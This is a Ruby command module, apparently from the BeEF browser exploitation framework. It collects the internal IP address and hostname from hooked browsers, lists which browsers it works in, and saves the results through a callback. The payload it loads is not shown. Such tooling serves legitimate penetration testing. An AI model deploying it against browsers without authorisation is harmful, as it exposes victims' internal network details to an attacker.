#
#   Copyright 2011 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
class Detect_local_settings < BeEF::Core::Command
  
  def initialize
    super({
      'Name' => 'Detect local settings',
      'Description' => 'Grab the local network settings (i.e internal ip address)',
      'Category' => 'Network',
      'Author' => ['pdp', 'wade', 'bm'],
      'File' => __FILE__
    })
    
    set_target({
        'verified_status' =>  VERIFIED_WORKING, 
        'browser_name' =>     FF
    })
    
    set_target({
        'verified_status' =>  VERIFIED_WORKING, 
        'browser_name' =>     C
    })
    
    set_target({
        'verified_status' =>  VERIFIED_NOT_WORKING, 
        'browser_name' =>     IE
    })
    
    use 'beef.net.local'    
    use_template!
  end
  
  def callback
    content = {}
    content['internal ip'] = @datastore['internal_ip'] if not @datastore['internal_ip'].nil?
    content['internal hostname'] = @datastore['internal_hostname'] if not @datastore['internal_hostname'].nil?
    
    content['fail'] = 'could not grab local network settings' if content.empty?
    
    save content
  end
  
end
